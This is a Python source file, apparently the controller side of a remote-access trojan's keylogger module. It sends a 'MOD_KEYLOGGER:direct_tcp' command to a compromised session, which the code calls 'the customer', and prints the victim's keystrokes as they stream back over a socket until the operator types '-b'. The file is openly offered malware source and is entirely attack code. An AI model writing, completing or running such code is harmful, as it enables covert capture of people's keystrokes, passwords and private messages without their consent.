import threading
from .handler import Handler
#from .other import XOREncryption
from .other import printColor
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT, SPLIT 
from .management import CheckConn

class Keylogger:


    status_directTcp = True


    def __init__(self, session_nb):

        self.session_nb = session_nb
        Keylogger.status_directTcp = True
        print("in keylogg")


    def recvThread(self):

        
        while Keylogger.status_directTcp:
            print("tread started ...")
            keystroke = CheckConn().recvsafe(Handler.dict_conn[self.session_nb ][NB_SOCKET],64,False)
            if not (keystroke):
                #if error
                break
            else:
                print(keystroke,end="")

    def directTcp(self):
        
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb ][NB_SOCKET], "MOD_KEYLOGGER:direct_tcp")):
         #   self.recvThread()
            
            recv_thread = threading.Thread(target=self.recvThread)
            recv_thread.start()

            while True:
                inp = input("\n>")
                if(inp == "-b"):
                    break
            Keylogger.status_directTcp = False
            recv_thread.join()
            
            print("FINISHHHHHH") 
        else:
            printColor("error", "[-] Unable to send the KEYLOGER MODE to the customer.\n")
